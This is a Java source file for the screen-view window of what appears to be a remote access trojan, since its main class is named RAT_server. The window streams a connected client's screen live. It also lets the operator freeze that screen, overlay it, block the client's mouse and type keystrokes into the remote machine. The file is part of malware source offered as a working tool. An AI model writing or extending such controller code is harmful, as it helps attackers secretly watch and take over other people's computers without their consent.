package electron.gui;

import java.io.IOException;
import java.net.URL;

import electron.RAT_server;
import electron.actions.Misc;
import electron.networking.packets.OutputPacket;
import electron.utils.Utils;
import electron.utils.logger;
import javafx.application.Platform;
import javafx.embed.swing.SwingFXUtils;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.control.CheckBox;
import javafx.scene.control.TextField;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.image.WritableImage;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Stage;

public class ScreenViewControls {
	@FXML
	private AnchorPane screen_pane;
	@FXML
	private ImageView screen_image;
	@FXML
	private CheckBox screen_mode;
	@FXML
	private TextField screen_keyfield;
	private static boolean isCreated = false;

	@FXML
	private void initialize() {
		Runnable updateRunnable = new Runnable() {
			@Override
			public void run() {
				while (true) {
					Platform.runLater(() -> {
						updateScreen();
					});
					try {
						Thread.sleep(100);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					if (isCreated == false) {
						logger.log("[electron.gui.ScreenViewControls]: interrupted update thread.");
						break;
					}
				}
			}
		};
		new Thread(updateRunnable).start();
	}

	public static void create() throws IOException {
		if (isCreated) {
			Utils.showErrorMessage("Incorrect action", "Can't create new Frame", "One frame already exists.", false);
			return;
		}
		Stage screenviewstage = new Stage();
		screenviewstage.setTitle("Screen view");
		URL url = RAT_server.class.getResource("/resources/screentabview.fxml");
		logger.log("[Graphics]: loading .fxml config: " + url);
		FXMLLoader loader = new FXMLLoader(url);
		Scene scene = new Scene(loader.load());
		screenviewstage.setScene(scene);
		Image img = new Image(RAT_server.class.getResourceAsStream("/resources/screenicon.png"));
		screenviewstage.getIcons().add(img);
		isCreated = true;
		screenviewstage.show();
		screenviewstage.setOnCloseRequest((event) -> {
			logger.log("[electron.gui.ScreenViewControls]: closed window.");
			isCreated = false;
		});
	}

	private void updateScreen() {
		if (MainWindowControls.handler == null || MainWindowControls.handler.getScreen() == null) {
			return;
		}
		// Resize system
		screen_image.setPreserveRatio(screen_mode.isSelected());
		screen_image.setFitWidth(screen_pane.getWidth());
		screen_image.setFitHeight(screen_pane.getHeight());
		WritableImage img = SwingFXUtils.toFXImage(MainWindowControls.handler.getScreen(), null);
		screen_image.setImage(img);
	}

	@FXML
	private void freezeScreen() {
		FreezeScreenImage.paint(MainWindowControls.handler.getScreen());
	}

	@FXML
	private void screen_overlayAction() {
		Misc.toggle_overlay(MainWindowControls.handler, false);
	}

	@FXML
	private void screen_blockMouseAction() {
		Misc.toggle_blockmouse(MainWindowControls.handler, false);
	}

	@FXML
	private void screen_sendkeysAction() {
		if (MainWindowControls.handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.", false);
			return;
		}
		Misc.presskeys(MainWindowControls.handler, screen_keyfield.getText(), false);
	}

	@FXML
	private void toggleScreen() {
		if (MainWindowControls.handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.", false);
			return;
		}
		Misc.toggle_screen(MainWindowControls.handler, false);
	}
}
